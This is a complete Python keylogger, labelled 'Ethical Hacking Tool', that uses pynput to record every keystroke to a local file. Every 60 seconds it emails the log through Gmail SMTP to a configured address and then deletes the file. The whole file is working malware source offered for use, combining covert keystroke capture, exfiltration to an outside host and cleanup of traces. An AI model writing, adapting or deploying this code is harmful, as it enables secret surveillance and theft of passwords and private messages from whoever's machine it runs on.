import yagmail
import os
import threading
from pynput import keyboard

# ==============================
#        KEYLOGGER BY J4Gr3p
# ==============================
BANNER = """
╔══════════════════════════════╗
║   KEYLOGGER BY J4Gr3p        ║
║   Ethical Hacking Tool       ║
║   Github: github.com/J4Gr3p  ║
╚══════════════════════════════╝
"""
print(BANNER)

# Configuración del correo
EMAIL_REMITENTE = "tu_email@gmail.com"  # Reemplaza con tu correo
EMAIL_PASSWORD = "tu_contraseña"  # Usa una App Password de Gmail
EMAIL_DESTINO = "destinatario@gmail.com"  # Reemplaza con el correo de destino

ARCHIVO_LOG = "keylog.txt"

# Tiempo en segundos entre envíos de correo
INTERVALO_ENVIO = 60  

def enviar_email():
    """Función para enviar el log por correo automáticamente."""
    if os.path.exists(ARCHIVO_LOG) and os.path.getsize(ARCHIVO_LOG) > 0:
        try:
            yag = yagmail.SMTP(EMAIL_REMITENTE, EMAIL_PASSWORD)
            yag.send(to=EMAIL_DESTINO, subject="Registro de Keylogger", contents="Adjunto el log.", attachments=ARCHIVO_LOG)
            print("[+] Log enviado con éxito.")
            os.remove(ARCHIVO_LOG)  # Borra el archivo después de enviarlo
        except Exception as e:
            print(f"[!] Error al enviar el correo: {e}")

    threading.Timer(INTERVALO_ENVIO, enviar_email).start()  # Reprograma el envío

def on_press(key):
    """Captura las teclas presionadas y las guarda en un archivo."""
    try:
        with open(ARCHIVO_LOG, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(ARCHIVO_LOG, "a") as log:
            log.write(f" [{key}] ")

# Iniciar el envío automático de logs
enviar_email()

# Iniciar la captura de teclas
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
